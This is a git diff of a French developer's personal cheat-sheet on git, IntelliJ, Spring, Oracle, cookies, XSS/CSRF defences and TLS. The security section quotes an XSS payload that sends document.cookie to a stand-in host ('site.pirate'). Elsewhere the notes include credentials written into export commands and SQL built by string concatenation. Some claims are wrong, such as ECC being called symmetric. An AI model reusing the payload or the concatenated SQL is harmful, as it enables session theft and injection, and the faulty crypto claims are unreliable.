@@ -818,7 +818,7 @@ docker-compose : dockercompose : s'installe avec apt-get ou aptitude
                 docker-compose down // attention, supprime tous les conteneurs et images sauf les volumes
                 docker-compose down -v// attention, supprime tous les conteneurs, images et volumes managés                                        
 		docker-compose push // push par defaut dans le docker.hub.(des ricains) sauf si j'ai tagge LINKtagregistr mon image 
-Kubernetes :(K8) le cluster K8 contient des Nodes(Masters et Workers)
+Kubernetes :(K8) le cluster K8 contient des Nodes(Masters et Workers) AFAIRE si besoin voir istio mesh kubernetes
 	gere des millions de containers docker ou autres dans des env varies: cloud ou serveurs au lieu de le faire par scripts
 	-pas de downntime; scalable(rapidité); desastre resilient grace a backup/restore 
 	installation sur debian:
@@ -1205,6 +1205,7 @@ github : guitub :  git : gitub : (installable sur mobaxterm:depoxer le plugin da
     branches: master; develop; etc etc... elles existent en local et sur le repo distant et sont toutes TOUTES indépendantes les unes des autres c a d: je peux avoir en local un master qui push dans le develop distant. Les branches c de la merde. DEVOPS.
         si j'ai (HEAD detached from 351dcab) c'est parce que mon HEAD est orphelin et dans aucune branche(parce que j'ai fait un git checkout sur un commit). faire git stash save "bla"; git checkout master; git merge codeDeMonHeadDetached. Ancienne methode: pour le recuperer dabord le rattacher a une branche temporaire: git branch temp puis git checkout temp. Ensuite il faut ecraser une branche par temp (voir ci dessous)
       git branch -vv// pour voir toutes les branches et a quel repository origin(origin=remote) elles sont liées(attention ne montre pas toutes les branches en fait. pour les voir toutes git branch -av si toujours pas toutes faire git fetch avant) et voir quelle branche est activee A8. Ou est mon HEAD. Les branches c la merde. DEVOPS
+      git branch -a // pour voir aussi toutes les branches remote repository
       git branch nomdelabrancheacreer // pour creer une nouvelle branche: ca ne cre pas une branche vide: ca copie la branche actuelle au commit ou je me trouve (meme ce qui n'est pas addé) dans la nouvelle branche. Les branches c la merde. DEVOPS
                                           maintenant je peux checkouter sur cette nouvelle branche ET avant tout faire un commit dessus sinon LINK98530!!!! puis je peux la pusher sur le repo distant: si le nom de la branche local est le meme que sur une branche du repository distant alors il va pusher dans cette branche qui a ce meme nom. Pas mal pour pusher sur une autre branche facilement.
       git branch -d nombrancheasupprimerDeleter // supprimer une branche. Ne pas se placer dans cette branche avant de faire ca.
@@ -1247,7 +1248,9 @@ github : guitub :  git : gitub : (installable sur mobaxterm:depoxer le plugin da
 
       git revert -m 1 [hash d'un commit precedent ou d'un commit-merge de branche] // se mettre dans la branche qui a recu le commit ou le commit-merge d'une autre branche. Ca va annuler ce commit ou commit-merge-de-branche et ca va ajouter un nouveau commit dans ma branche actuelle: pratique pour annuler un commit ou un merge du passé anterieur
       git reset HEAD~ annule/undo le dernier commit. Ne pas le faire après que mon dernier commit ait ete pushe et merge avec l'origin(remote) car cela desynchronise mon local du distant. Si je veux quand meme le faire par necessite alors faire git reverT <commitpourri>: ça recommiT un snap d'avant le commit pourri.
-                on peut aussi faire git commit --amend // pour redéfinir changer le message du dernier commit sans besoin de l'annuler
+                on peut aussi faire git commit --amend tout court voir LINKamend ou git commit --amend -m "autre message" // pour redéfinir changer le message du DERNIER commit sans besoin de l'annuler: aucun pb si il n'a pas déja ete pushé 
+		si il a deja ete pushé il faudra juste apres pusher avec --force
+		pour les precedent commits plus vieux voir rebase
       git reset //LINKresetgit annuler le dernier add
       git reset --hard <identifiantcommit>  revenir en arriere sur identifiantcommit par déplacement du HEAD sur identifiantcmmit et vire definitivement tous les trucs qui ont suivi mais le pb avec cette methode c'est que ca efface l'historique donc faire plutot git revert commitidDontJeNeVeuxPlus // ca vire ce commit là et ce qu'il a fait de mon historique????questcequej'ai voulu dire?
       git reset --hard versionDuTag: ce tag revient dans le mon HEAD/branch + repertoire et vire tout ce qu'il y a eu après
@@ -1260,7 +1263,7 @@ github : guitub :  git : gitub : (installable sur mobaxterm:depoxer le plugin da
       git rebase -i identifiantCommitDuPasséSeraExcluLorsDuRebase // ouvre un editeur affiche les commit du plus vieux en haut au plus recent en bas et je peux manipuler mes commits du passe pas a pas un par un jusqu'a aujourd'hui. J'ai du utiliser ca pour supprimer les indexs de fichiers trop gros qui m'empechaient de pusher sur le repo distant ou pour fusionner des commits
                 si je veux commencer depuis le debut faire git rebase -i --root
                 quand j'ai remplacé chaque pick souhaité par edit(changer le commit) ou squash (merger-fusionner des commits), faire comme dans vi: sauver et quitter. il fait alors du pas a pas sur chaque edit ou a chaque fois je fait soit git commit --amend(modifier le commit en cours) ou git rebase --continue(au suivant!)
-                        quand je fais git commit --amend alors il ouvre un editeur montrant le commit.(si il fait erreur de fusion faire git diff --check si toujours tenter git rebase --skip) Executer comme dans vi:!macommandeGit (exemple faire un checkout pour supprimer de l'index) et Entree a chaque fois. Quand fini faire:wq. et puis git rebase --continue et ainsi de suite pour finir avec un git rebase --continue jusqu'à ce que la branche rebase soit automatiquement mergée avec mon master.
+                        quand je fais git commit --amend alors il ouvre un editeur montrant le commit.(si il fait erreur de fusion faire git diff --check si toujours tenter git rebase --skip) Executer comme dans vi:!macommandeGit (exemple faire un checkout pour supprimer de l'index) et Entree a chaque fois. Quand fini faire:wq. et puis git rebase --continue et ainsi de suite pour finir avec un git rebase --continue jusqu'à ce que la branche rebase soit automatiquement mergée avec mon master. LINKamend
                 pour annuler mon rebase en cours faire 
                 git rebase --abort ou au pire pour sortir faire git rebase --quit
         pour supprimer tous les gros fichiers de l'historique pour que je puisse pusher sur github
@@ -1314,7 +1317,7 @@ git diff compare mon workspacepasencoreadded avec le dernier commit
       git stash clear // supprime tous mes stash! attention.
       si j'ai erreur Updates were rejected because the tip of your current branch is behind et que je veux quand meme pusher:
             je peux faire git push -f      
-     git cherry-pick <numerodecomitSEULQueJeVeuxRecupererLaOuJeSuis> // attention de commiter avant de faire ca. si il dit error:... c juste que le merge est à refaire a la main. Ensuite si je reussi le merge: git add mes fichiers merges puis  git cherry-pick --continue sinon git cherry-pick --abort
+     git cherry-pick <numerodecomitSEULQueJeVeuxRecupererLaOuJeSuis> // attention de commiter avant de faire ca. Attention meme sur intellij immediatement il traite, et apres sur intellij il propose de commiter dans la foulée. si il dit error:... c juste que le merge est à refaire a la main. Ensuite si je reussi le merge: git add mes fichiers merges puis  git cherry-pick --continue sinon git cherry-pick --abort
     envoyer/recuperer des projets entre mon local et le github:
       fork: fait une copie de tout un projet (branches incluses) dans mon github. Je peux ensuite travailler dessus dans github ou en local(cloner) et à la fin je soumet mes modifs: pull request= merge request mergerequest. si accepte: ça fetch+merge+commit tout mon fork(je crois). SI il y en a plusieurs qui se suivent et que je dois accepter, ne prendre que le dernier et ignorer les precednets (je pense) car le dernier mergerequest resume tous les autres d'avant.
 	pour puller les modifs de l'origin de mon fork dans mon fork local: LINKpullupstream
@@ -1518,6 +1521,8 @@ Adobe illustrator :
 
   
 intelliji : intellij : 
+switcher entre majuscule et minuscule:
+	Ctrl+shift+u
 Shortcut pour Afficher le related problem
 	voir la view "problems" tapper related problem pour tomber sur la ligne, keyClickDroit>Fix>show problem > jump (A MIEUX DECRIRE)
 Si erreur no tests were found
@@ -1626,7 +1631,7 @@ Error:Unable to make the module: config-server_main, related gradle configuratio
       ouvrir view gradle > rafraichir
 convertir le projet en projet maven:
     click droit sur mon pom -> add module maven ou un truc comme ça      
-ajouter un module equivaut a importer un projet dans le worskpace: module intellij: project structure> "+" importer > choisir Maven ou Gradle sinon pas bon si je choisis "from existing sources" à priori et oui je confirme
+ajouter un module equivaut a importer un projet dans le worskpace: module intellij: project structure> "+" importer > choisir Maven ou Gradle sinon pas bon si je choisis "from existing sources" à priori et oui je confirme. pour faire un sous module changer dans l'input "name": surmodule.sousmodule
   main/java=source
   test>java = test
 voir les windows cote a cote split au milieu comparer comparaison
@@ -1674,7 +1679,7 @@ renommer rename un projet:
 trouver une classe meme dans les dependances et jars: Ctrl+n
 replace remplacer: Ctrl+r puis alt+e pour y le faire
 remplacer partout: Ctrl+shift+r
-remplacer avec des retours chariot ca marche cocher regexp et le retour chario c'est \n
+remplacer avec des retours chariot ca marche cocher regexp et le retour chario c'est \n ou [\s\S]
 hierarchie herite parent voir heritage: Ctrl+h
 voir hierarchie remonter methode parente sur methode faire Ctrl+u
 gotoline Ctrl+g
@@ -2722,7 +2727,7 @@ pour transformer un bean en json et vice et versa:
         Gson gson = new Gson(); // Or use new GsonBuilder().create();
          MyType target = new MyType();
          String json = gson.toJson(target); // serializes target to Json
-         MyType target2 = gson.fromJson(json, MyType.class); // deserializes json into target2
+         MyType target2 = gson.fromJson(json, MyType.class); // deserializes json into target2 // par defaut si j'ai un objet json {xxx:yyy,zzz:www} il me retourne une HashMap
 json-schemas : jsonschema : json-schema :   
   { "$schema": "http://json-schema.org/schema#" } // indique que ce document est un schema
   { "$id": "http://yourdomain.com/schemas/myschema.json" } // donne un identifiant unique à ce fichier schema. recommandé d'y mettre une url vers où se trouve ce fichier sur le net.
@@ -2804,7 +2809,7 @@ erreurs codes http: LINKcodesHttp
 401: non authorise (manque login/password): n'a pas encore été authentifé et le navigateur doit maintenant chercher à s'authentifier. En récupérent dans la résponse envoyée par le serveur le header  WWW-Authenticate et son( ou ses séparés par des virgules) challenge associé et doit renvoyer une requete avec en général le header WWW-Authenticate rempli mais ça peut etre autrechose.
 403 : interdit (login/password incorrect) authentification a bien été comprise mais elle est fausse
 404: page non trouvee
-405: methode http inadaptee: enlever de ma servlet super.doPost(req, resp); pour que ça marche.
+405: methode http inadaptee: enlever de ma servlet super.doPost(req, resp); pour que ça marche. ou bien j'ai ca parce que dans une requete post ajax, coté serveur je fais ça :req.getServletContext().getRequestDispatcher("/indexPro").forward(req,resp);
 406: mediatype de retour attendu ne correspond pas: exemple attend du json alors que c'est du html qui est retourné (par experience)
 407 : probleme de proxy ou plutot le proxy demande une authentification. le proxy a du renvoyer dans le header Proxy-Authenticate contenant comme valeur le challenge demandé. cela veut dire qu'il reclame le header Proxy-Authorization ou autre-chose
 408: timeout
@@ -3465,7 +3470,7 @@ mvc : voir https://maarten.mulders.it/2018/09/a-first-look-at-mvc-1.0/ (parle de
                     request.getServerName() // renvoit le domaine: monespacerh-dev.idkidscommunity.com
                     ou bien   request.getHeader("referer") ;// si c'est un src= et qu'on souhaite vraiment connaitre la page appelante. Mais peut etre que c Referer(R maj)
                     request.getProtocol() ... bof...)
-          	recuperer un cookie a partir du request: afficher la liste des cookies : (isSecure(): le navigateur n'envoi le cookie dans reseau que si canal est securisé https (seuil "securisé" paramétrable sur le navigateur). (donc si http + secure impossible d'ouvrir session). httpOnly: empecher javascript d'acceder aux cookies LINKcooklskjhh (pirate peut injecter dans champ <img onload="document.location="http://site.pirate?c=document.cookie"); Host-only 
+          	recuperer un cookie a partir du request: afficher la liste des cookies : (LINKlgjglgj isSecure(): le navigateur n'envoi le cookie dans reseau que si canal est securisé https (seuil "securisé" paramétrable sur le navigateur). (donc si http + secure impossible d'ouvrir session). httpOnly: empecher javascript d'acceder aux cookies LINKcooklskjhh (pirate peut injecter dans champ <img onload="document.location="http://site.pirate?c=document.cookie"); Host-only 
                                 Cookie[] cookies = request.getCookies(); //Attention peut renvoyer null
                                   String cookieName = SAPCookie;
                                   String defaultValue = 1;
@@ -4187,14 +4192,18 @@ quarkus : def: arc c'est CDI=Contexts and Dependency Injection: https://quarkus.
                 }
             si dans un service rest j'ai l'erreur can not access a member of class c'est parce que je ne peux pas convertir en json une classe qui est inner d'une autre classe.       
 
-webservice : webservices : voir LINKSWAGGER 
-
+microservices : microservice :webservice : webservices : voir LINKSWAGGER 
+	Les faire avec eventDriven? ALIRE: design for failure:
+		envisager que le reseau est faillible: designer les systemes pour qu'ils supportent les pannens en permanance à nous de mettre en place des fusibles qui cloisonnent l'impact ou on veut (detecter les multiples timeout et au bout d'un nb de retry, disjoncter) failfast+activer solution degradée + au bout d'un temps verif redispo et reactiver automatiquement
+		solutions: 
+			-les loadbalancers: bof...
+			-chaque module doit etre resilient
         -versionning: V.X.Y : Y changements mineurs sur le meme webservice. X:si changement majeur faire un autre webservice et ne pas toucher à l'ancien. ceux qui appellent le webservice peuvent basculer en X+1 quand ils veulent. Comme la regle ne pas modifier mais etendre.
                 A___          A___V1.0     A________V1.0
                     \_V.1.0   B   
                 B_--'             V2.0     B.V2.0---V2.0
         -mettre DNS clusturisé des webservice: les URL ne sont pas en dur dans les webservices mais dans ce DNS
-        -gérer l'overload par un buffer type kafka:queue qui appani les pics de charges.
+        -gérer l'overload par un buffer type kafka:queue qui appani les pics de charges. queue doit avoir une limite de pile. Si depasse doit etre géré
         -dans le cadre de microservices il faut qu'il y ait qun seul entrypoint point de départ de l'histoire et les liens renvoyés par les webservices respectant la norme HATEOAS permettent de savoir quelles autres urls je peux appeler.
 
           Navigate from POST to GET using REDIRECT LINKredirwebservice998 //on peut faire comme ca dans un webservice qui a une methode post
@@ -5032,7 +5041,7 @@ web.xml : webxml :
             		    sous <web-app>:<session-config>
                 	<session-timeout>15</session-timeout> mettre -1 pour une duree infinie de la session
                 	   <cookie-config>
-                	       <secure>true</secure> // fait pareil que LINKlizifoizf  (a partir de servlet3.0) attention du coup en http je ne peux peut etre plus me connecter
+                	       <secure>true</secure> // fait pareil que LINKlizifoizf  (a partir de servlet3.0) attention du coup en http je ne peux peut etre plus me connecter. Du coup request.isSecure() renverra true LINKlgjglgj
                            <http-only>true</http-only> // fait pareil que LINKlkgjkljkjgjgjgjgj
                 	  <cookie-config>
                 </session-config>
@@ -6732,6 +6741,12 @@ Spring : JAVA STYLE
                                                         avec namedParameterJdbcTemplate.getJdbcOperations().methodes de jdbctemplate disponibles ici!:-)
                                                         exemple pour faire un update avec namedjdbctemplate: int update = jdbcTemplate.getJdbcOperations().update((String) properties.get("sqlUpdatePassword"), new Object[] {password, userid, oldpassword});
                 }                                       exemple pour faire un select avec namedparameterjdbctemplate: List<UserBean> res = (List<UserBean>) jdbcTemplate.getJdbcOperations().query("select CDPASS from UC10 where CDUTIL ='"+lognidUpperCase+"'", new UserBeanRowMapper()); // pas réussi en faisant soit ? soit:xxx procédure stockee
+							retourner une liste avec une procedure stockee:
+								malist = this.jdbc.query(requete,new Object[]{bicCode,rancheCode},new RowMapper<BicDir>(){
+									@Override
+									public BicDir mapRow(final ResultSet result, final int rowNo) throws SQLException{
+										BicDir bicdir = new BicDir();
+										bicdir.setBicCode(result.getString("BIC_CODE");
         Explicitly name your component [@ComponentGENERIQUEEVITERDUTILISERUtiliser@Named(“beanName”)] ou mes configs: @Configuration("nomdemaconfig")
                                          class MonComponentBeanName                class MaConfigConfName VOIR conf ci dessous.
         on peut ensuite dans une classe les appeller avec @Resource(name="beanName ou nomdemaconfig" ou rien mettre c comme @Autowire) UneIntefrace maSource;
@@ -6914,7 +6929,7 @@ AILLEURS: injecter mes beans par constructeur
                 dans Tomcat context.xml, LINK39210                                     pour faire les tests: mocker un jndi en conf: Pour declarer une data base de donnée pour requetes sql
                         <Resource                                                      <beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd"> 
                                name="jdbc/sqliteDS"                                      <bean id="dataSource" class="org.apache.tomcat.dbcp.dbcp.BasicDataSource ou org.springframework.jdbc.datasource.DriverManagerDataSource" destroy-method="close"> (cette classe à pour interface javax.sql.Datasource et c ca qu'on utilise dans le code) ou <bean id="dataSourceRepository" class="org.springframework.jdbc.datasource.DriverManagerDataSource">  
-                               auth="Container"                                            <property name="driverClassName" value="oracle.jdbc.driver.OracleDriver" />                      
+                               auth="Container"                                            <property name="driverClassName" value="oracle.jdbc.driver.OracleDriver" />   a mettre si message No suitable driver found
                                type="javax.sql.DataSource"                                 <property name="url" value="jdbc:oracle:thin:@server:port:instance" />                           
                                maxActive="4"                                               <property name="username" value="user" />                                                          
                                maxIdle="2"                                                 <property name="password" value="pwd" />                                                       
@@ -7287,7 +7302,7 @@ Spring : XML STYLE
                                                             jdbc.url=${blahEstRempliParMaven}
                           utiliser les proprietes:  
                               <bean id="dataSource" destroy-method="close" class="org.apache.commons.dbcp.BasicDataSource"> //close est appele si mon ((ConfigurableApplicationContext)WebApplicationContextUtils.getRequiredWebApplicationContext(request.getSession(false ou true).getServletContext())).close(); est appele
-                              <property name="driverClassName" value="${jdbc.driverClassName}"/> 	
+                              <property name="driverClassName" value="${jdbc.driverClassName}"/>  a mettre si message No suitable driver found
                               <property name="url" value="${jdbc.url}"/>
                               <property name="username" value="${jdbc.username}"/>
                               <property name="password" value="${jdbc.password}"/>
@@ -9503,7 +9518,7 @@ hsqldb : LINKldkjgieieioruz
         base de donnée pour les tests
         si erreur data exception: string data, right truncation c'est parce que j'ai voulu inserer une colonne trop longue
     <bean id="dataSource" class="org.apache.commons.dbcp.BasicDataSource">
-		<property name="driverClassName" value="org.hsqldb.jdbcDriver" /> 
+		<property name="driverClassName" value="org.hsqldb.jdbcDriver" /> a mettre si message No suitable driver found
 		<property name="url" value="jdbc:hsqldb:mem:v3" /> // bien mettre mem sinon il fait chier avec les connexions mais c'est que pour tester car volatile
 		<property name="username" value="sa" />
 		<property name="password" value="" />
@@ -10529,7 +10544,7 @@ pour reactiver une contrainte:
     shutdown abort; 
     startup (avec l'option pfile si besoin)
     le fichier allow se trouve sous /etc/host.allow
-    se connecter sur oracle: su - oracle // se connecter en tant qu'un autre utilisateur.
+    se connecter sur oracle: su - oracle ou sesu - oracle // se connecter en tant qu'un autre utilisateur.
     puis se mettre sous l'instance: adequate: 
     instance DB_EGN
     puis demarrer le listener: lsnrctl start (documentation dispo sur internet)
@@ -10911,6 +10926,8 @@ pour faire un export exporter de dump d'une base:
 			set ORACLE_SID=wecopeo01
 			exp wec_adm/wecprod1234@WECPRODOLD
 			exp wec_adm file=wec.dump log=wec.log consistent=yes compress=no buffer=100000
+			ou si je veux au format SQL:
+				exp wec_adm SQLFILE=/my/file/name.sql log=wec.log consistent=yes compress=no buffer=100000
 			exp pae_adm/pae_adm_01@SIA.INT  
 			exp r08_r/r08_r_r08@GDV_PROD.WORLD
 			exp r08_adm/r08_adm_int01@GDV_INT10.WORLD
@@ -13554,7 +13571,7 @@ OSGI :  Karaf : 1classloader/bundle
                           pour se connecter a une base de donnee: premiere methode:
                         		<bean id="dataSource" class="org.springframework.jdbc.datasource.DriverManagerDataSource">
                                             <!--  <property name="url" value="jdbc:mysql://localhost:3306/person"/> -->
-                                            <!--  <property name="driverClassName" value="oracle.jdbc.driver.OracleDriver" /> -->
+                                            <!--  <property name="driverClassName" value="oracle.jdbc.driver.OracleDriver" /> -->  a mettre si message No suitable driver found
                                             <property name="url" value="${datasource.jdbc.url}"/>
                                             <property name="username" value="${datasource.user}"/>
                                             <property name="password" value="${datasource.password}"/>
@@ -14079,8 +14096,9 @@ Cryptage : crypto : en java
                 MD5 et SHA1: obsoletes pour hasher. SHA1>MD5
                 RSA = asymetrique paire de cles (taille cle peut varier) (symetrique plus rapide que asymetrique) doit etre utilisé avec le padding OAEP
                     RSA-SHA256 = RS256
+		ECC: elliptic curve cryptography est symetrique
 		AES successeur de DES = symetrique = DESED?  //AES 1)ECB:bof que pour les tout petites chaines de char<128bits bof car il encrypte toujours de la meme facon un bloc avec une cle donnee 2)CBC:s'utilise avec un Padding et un IV InitializationVector(vecteur a pour vocation de ne servir qu'une seule fois et le transmettre au parti et le changer à chaque fois.) qui est juste un randomdata de 128bits ne doit s'utiliser qu'une fois et peut etre public. avec le padding PKCS#5 ou #7 il est vulnérable au padding oracle attacks 3)CTR:IV sert sur tous les blocs.<M-F12>
-			3DES plus fort que DES
+			3DES plus fort que DES mais 3DES obsolete aussi
                 ECDSA = asymetrique (plus lent que symetriques)
                     ECDSA-SHA512 = ES512 
                 HMAC =  symetrique(sur?). signature et verification de la signature avec la meme cle
@@ -15872,26 +15890,36 @@ hacking : haking : hack :
         MD5 et SHA1 et SHA2 sont obsoletes. parade: hasher 4 fois de suite. BcryptPasswordEncoder de spring le fait pour nous pour hasher des passwords par exemple
         ne pas loguer les users passwords  
 			  injection sql : ne jamais faire de requete sql par concatenation mais toujours pas procedure stockée. Un hacker sinon peut metre un bout de sql dans un champ texte. idemn sur mongodb
-        x-frame-options header not set // en-tête header http de response permettant d'eviter qu'un site s'affiche dans un autre site (iframe i-frame object).(clickjacking: quand je clique ça clique sur un autre bouton invisible). Ne plus utiliser ça c'est vieux et remplacé par content-security-policy  LINKxframeiframe
+        x-frame-options header not set // en-tête header http de response permettant d'eviter que mon site soit dans l'iframe d'un site mechant (iframe i-frame object).(clickjacking: quand je clique ça clique sur un autre bouton invisible). utiliser ça que pour anciens browsers car c'est remplacé par content-security-policy. mettre les 2 si parc de browser peut etre de tout LINKxframeiframe
 		option possibles: deny ou sameorigin(meme domaine exactement, pas sous domaine, meme port meme scheme.). Si je veux mettre mon site dans un iframe je dois mettre CSP:(content-security-policy)
 	CSP :content-security-policy contentsecuritypolicy: pour dire si j'ai le droit de faire du chargement de source src. Ne rien mettre si je veux laisser openbar je crois sauf pour frame-ancestors ou la je dois le dire LINKxframeiframe
-		Content-Security-Policy default-src *;frame-ancestors https://url.qui.a.le.droit.dafficher.mon.site.dans.son.iframe;  // lire de droite à gauche: ici: par defaut tout est authorisé
+		Content-Security-Policy default-src *;frame-ancestors https://url.qui.a.le.droit.dafficher.mon.site.dans.son.iframe;  // lire de droite à gauche: ici: par defaut tout est authorisé //default-src pour dire que ça s'applique à toutes les resources: child-src   connect-src   font-src   frame-src   img-src   manifest-src   media-src   object-src   prefetch-src   script-src   script-src-elem   script-src-attr   style-src   style-src-elem   style-src-attr   worker-src
 		Content-Security-Policy default-src 'self' *.trusted.com; img-src *; media-src un.site.com un.autre.com; script-src un.site.com;  // lire de droite à gauche: ici: les medias sont acceptes seulement sur deux site, les images de partout, sinon par defaut le reste de type de données seulement par moimeme et tout.trusted.com
 			les types de données possibles sont:font-src(caracteres),frame-src(iframes),img-src,manifest-src,media-src(audio et videos),object-src,script-src(javascript),style-src(css),worker-src(webworkers) 
 		comme c'est galère, pour le debugger tester:
 			Content-Security-Policy-Report-Only: default-src https:; report-uri /uneFinDurlQuelqonque // et je regarde dans le debugger du browser ce qu'il envoie comme rapport
        	Feature-Policy: pour dire si j'ai le droit d'executer un type de truc
 		Feature-Policy unsized-media 'self' https://un.site.com; geolocation 'none' camera *;  // lire de droite à gauche: ici: camera marchera depuis n'importe quel autre site, geolocation complettement OFF; unsized-media seulement par moi et un.site.com en https
-         xss ://crosssitescripting // ma servlet vulnerable fait executer au navigateur du javascript passé en parametre de ma requete. ce javascript pourrait lire mes cookies (de session!): LINKcooklskjhh LINKc.s.r.f  et le pirate de se connecter à ma place
+         xss ://crosssitescripting // le nom est mal choisi: il n'y a rien de CROSS la dedans. C'est juste une injection de javascript etranger dans ma page qui va s'executer et va méchemment lire mes cookies (de session par ex. il peut car c le meme domaine (origin)) LINKcooklskjhh LINKc.s.r.f  les envoyer en javax vers serveur du hacker et se connecter à ma place 
 			3 types:
-				reflected: user clique sur un lien malicieux qui contient un payload de javascript 
+				reflected: user clique sur un lien malicieux qui contient un payload de javascript. Lien mechant click! browser->serveur->retour vers browser->execution javascript accède à tout puisque provient de meme origin :ma servlet vulnerable fait executer au navigateur du javascript passé en parametre de ma requete. 				
+				dombBased: user clique sur un lien malicieux qui contient un payload de javascript qui sans passer par le serveur est directement executé sur la page grace à l'exploittation de code javascript legitime applicatif deja en place
+				stored: hacker enregistre javascript méchant dans la base de donnée. Serveur retourne ce js au navigateur et lui fait executer ce javascript mechant.
 			securehtml validite champ formulaire field
                     pour s'en premunire faire du @safeHTML 
 			ou faire  org.jsoup.Jsoup.isValid(lechampatester); ou return Jsoup.parse(field).select("script").size()==0 sur les champs pour que du javascript ne puisse pas etre injecté dedans. aussi empecher le javascript d'acceder aux cookies.
                     ou faire dans la jsp: <c:out value="${une_variable_renvoiee_par_la_servlet}"/> // du coup une_variable_renvoiee_par_la_servlet ne peut plus executer du javascript 
         pathtraversal// une servlet renvoit n'importe quel fichier ! ex: monsite/maservlet?vachercher=/unpath/unfichierANeSurtoutPasMontrer !affiche le fichier!    
         redirectionexterne // une servlet redirige vers un autre site! http://monsite?maservletTresConne?forward=http://un_autre_site
-        CSRF :=XSRF :(CrossSiteRequestForgery :) LINKc.s.r.f (Cross-site scripting appartient à csrf) 
+        CSRF :=XSRF :(CrossSiteRequestForgery :) LINKc.s.r.f (Cross-site scripting appartient à csrf) lire https://speakerdeck.com/ropnop/dont-cross-me-same-origin-policy-and-all-the-cross-vulns-xss-csrf-and-cors?slide=48
+		2 modes:
+			A) requete HTML executée sur page du domaine
+				victime clique sur lien mechant contenenant javascript caché(dans une image par ex) et ce lien retourne un formulaire HTML mechant(transfert de tunes) qui est soumis vers serveur legitime avec les cookies de la victime 
+				parade: - la methode traditionelle mais long à faire/ou/utiliser spring de merde, Utiliser des jetons de validité dans les formulaires: faire ne sorte qu'un formulaire ne soit accepté que s'il a été produit quelques minutes auparavant: le jeton de validité en sera la preuve. Le jeton de validité stokés coté serveur dans la session de l'utilisateur est envoyé sur le browser. Au retour il doit etre tansmis en parametre et vérifié côté serveur puis supprimé de la session.
+					- envoyer les cookies uniquement par javascript legitime:
+						- doublesubmit: quand dans page legitime user valide form, du javascript ajoute au form un token stocké dans les cookies en y accedant pour l'envoyer dans le body ET dans les cookies du serveur qui lui verifie que les 2 (cookie et body) matchent
+						- customheader: aucune requete html form n'est envoyée et acceptée par le serveur legitime pour les posts. Tout passe par au prehalable du javascript legitime qui fait de l'ajax en ajoutant les cookies avec xhr.withCredentials=true; et un petit flag truc=constante et le serveur s'assure qu'il y a bien ce flag: ca voudra dire que c'est du javascript legitime qui a mis les cookies dans la requete donc cette requete est OK
+			B) Requete HTML executée sur page etrangère
           inciter quelqu'un qui est connecté avec sa session sur le site X à lui faire executer une requette HTTP (genre rm -r*) par javascript caché (dans une image par ex) depuis un autre site web sur le meme navigateur.           
               la parrade est: CORS
                       - limiter Access-Control-Allow-Origin : ainsi le serveur fait une preflight request method=OPTION qui verifie si cette requete provient de source sure avant d'acceper la vraie requete.
@@ -15899,7 +15927,7 @@ hacking : haking : hack :
                       - Effectuer une vérification du référent referer dans les pages sensibles: connaître la provenance du client permet de sécuriser ce genre d'attaques. Ceci consiste à bloquer la requête du client si la valeur de son référent est différente de la page d'où il doit théoriquement provenir.
                       - captcha mais tres tres bof ici car lourd pour l'utilisateur: faire un captcha pour chaque formulaire beurk
         Session hijacking: si pas en https: hacker peut sniffer sur le reseau mon jsessionid ou autre. Pour eviter faire LINKlizifoizf                      
-        hsts : header response strict-transport-security pour que le browser n'accepte de naviger que en https                      
+        hsts : header response strict-transport-security pour que le browser n'accepte de naviger que en https LINKlgjglgj
     metasploitable:
         /usr/share/metasploit-framework
         chemin prog pour pirater:     /modules/exploits/...
@@ -15919,7 +15947,7 @@ cookies :
     "SetCookie" est envoyé du serveur vers le navigateur pour dire au navigateur lors de la prochaine requête de renvoyer ça dans Cookie
     
     dans le serveur setter le httponly: LINKcooklskjhh
-                        NewCookie hraCookie= new NewCookie(UserManagementConstants.CONNECTION_ID, getDatasourceSessionIdFromContext(), "/", getCookieDomain(), null, -1, httpRequest.isSecure());
+                        NewCookie hraCookie= new NewCookie(UserManagementConstants.CONNECTION_ID, getDatasourceSessionIdFromContext(), "/", getCookieDomain(), null, -1, httpRequest.isSecure()); LINKlgjglgj
                         return javax.ws.rs.core.Response.seeOther(go).header("Set-Cookie",hraCookie.toString()+"; Secure; HttpOnly").build();                                              |_revoit true si on est en https
                         ou en spring :Cookie cookie = WebUtils.getCookie(request, "JSESSIONID"); response.addCookie(new Cookie("JSESSIONID", cookie.getValue()+"; Secure; HttpOnly")); sur les browsers plus recents, secure est viré du cookie automatiquement si je suis en http.
                                                                                                                                                                     |_bien, que des strings. KISS. car la methode .setSecure() des fois marche po bien: si on a une passerelle http puis https
@@ -15928,7 +15956,7 @@ cookies :
                                       		final String cookieDomain = getCookieDomain();
                                       		Cookie cookie = new Cookie(name, value); //exemple: ("bla,"bli");
                                       		cookie.setPath(cookiePath);
-                                      		//cookie.setSecure(httpRequest.isSecure()); //.isSecure() renvoit true si on est en https. setsecure n'envoie le cookie a travers le reseau que si on est en https 
+                                      		//cookie.setSecure(httpRequest.isSecure()); //.isSecure() renvoit true si on est en https. setsecure n'envoie le cookie a travers le reseau que si on est en https LINKlgjglgj
                                       		cookie.setSecure(true); //setSecure: le cookie n'est transmis sur le reseau que si on est en https marche bof bof par rapport à LINKcooklskjhh. on peut aussi faire comme ça: LINKlizifoizf 
                                       		cookie.setHttpOnly(httpOnly); //javascript n'a pas acces au cookies LINKlkgjkljkjgjgjgjgj
 letsencrypt :
@@ -16003,7 +16031,8 @@ condidentialite/authenticite/non-repudiation=integrite(non modifie sur reseau) H
     sur windows pour voir la liste des certificats root d'autorité reconnus: executer certmgr.msc
         web:
         SERVEUR                                             CLIENT
-                <------------------------------------------salut! https! je peux utiliser ces methodes d'encryptage: SSL3.0(vieux), TLS1.0 (presque co SSL3), TLS1.2, TLS1.3(tres != de TLS1.2) laquelle veux tu choisir?
+		----------------ServerHello----------------> // facultatif: pendant une navigationc'est possible que ce soit le serveur qui demande une renegociation
+                <--------------ClientHello-----------------salut! https! je peux utiliser ces methodes d'encryptage: SSL3.0(vieux), TLS1.0 (presque co SSL3), TLS1.2, TLS1.3(tres != de TLS1.2) laquelle veux tu choisir? //forcer en TLS1.3 est une bonne chose et cela se fait sur le reverse proxy ou la conf du serveur (apache, nginx, payara....) cette info est visible sur le browser > afficher details certificat
         possede 1certif 
         contenant une signature = message hashee (MD5_vieux,SH1_vieux ou SH2) et cryptee avec clee privee
         Je choisis la plus recente des versions d'encryptage.
